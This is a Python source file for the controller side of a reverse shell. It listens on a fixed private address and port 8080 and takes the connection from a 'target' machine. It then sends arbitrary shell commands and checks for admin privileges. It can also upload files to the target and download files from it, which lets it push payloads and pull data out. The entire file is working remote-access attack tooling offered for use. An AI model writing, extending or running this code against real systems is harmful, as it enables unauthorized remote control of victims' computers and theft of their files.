import socket
import os
import base64

def connect():
    print("[+] Starting server on port 8080...")
    server_socket = socket.socket()
    server_socket.bind(("192.168.19.139", 8080))
    server_socket.listen(1)
    connection, address = server_socket.accept()
    print(f"[+] Connection from {address}")
    
    # Get initial system info
    print(connection.recv(1024).decode())
    print("[+] Type 'help' to see commands")
    
    while True:
        try:
            command = input("Shell > ")
            
            if command == "help":
                print("\nCommands:")
                print("  pwd - Get current directory")
                print("  ls - List files")
                print("  cd <dir> - Change directory")
                print("  checkadmin - Check privileges")
                print("  upload <local> <remote> - Send file to target")
                print("  download <remote> <local> - Get file from target")
                print("  terminate - Exit\n")
                continue
                
            if command == "terminate":
                connection.send("terminate".encode())
                break
                
            # Handle file upload
            elif command.startswith("upload "):
                parts = command.split(" ", 2)
                if len(parts) != 3:
                    print("[!] Usage: upload <local> <remote>")
                    continue
                
                local_file, remote_path = parts[1], parts[2]
                
                if not os.path.exists(local_file):
                    print(f"[!] File not found: {local_file}")
                    continue
                    
                with open(local_file, "rb") as f:
                    file_data = f.read()
                
                encoded_data = base64.b64encode(file_data).decode()
                connection.send(f"upload {remote_path} {encoded_data}".encode())
                print(connection.recv(1024).decode())
                
            # Handle file download
            elif command.startswith("download "):
                parts = command.split(" ", 2)
                if len(parts) != 3:
                    print("[!] Usage: download <remote> <local>")
                    continue
                
                remote_file, local_path = parts[1], parts[2]
                connection.send(f"download {remote_file}".encode())
                
                response = connection.recv(1024).decode()
                if response.startswith("[!]"):
                    print(response)
                    continue
                
                print(response)  # Print file info
                
                # Receive file data
                file_data = ""
                while True:
                    chunk = connection.recv(4096).decode()
                    if chunk.endswith("ENDOFFILE"):
                        file_data += chunk[:-9]
                        break
                    file_data += chunk
                
                if file_data.startswith("BASE64:"):
                    decoded_data = base64.b64decode(file_data[7:])
                    with open(local_path, "wb") as f:
                        f.write(decoded_data)
                    print(f"[+] File saved to {local_path}")
                
            # All other commands
            else:
                connection.send(command.encode())
                print(connection.recv(4096).decode())
                
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    
    connection.close()
    print("[+] Connection closed")

if __name__ == "__main__":
    try:
        connect()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")